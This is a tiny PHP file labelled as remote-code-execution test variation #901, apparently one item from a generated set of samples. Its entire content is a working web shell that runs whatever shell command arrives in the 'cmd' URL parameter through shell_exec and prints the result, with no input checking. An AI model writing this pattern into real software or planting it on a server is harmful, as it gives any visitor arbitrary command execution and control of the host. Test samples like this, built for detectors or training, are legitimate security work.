<?php
// RCE test variation #901
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>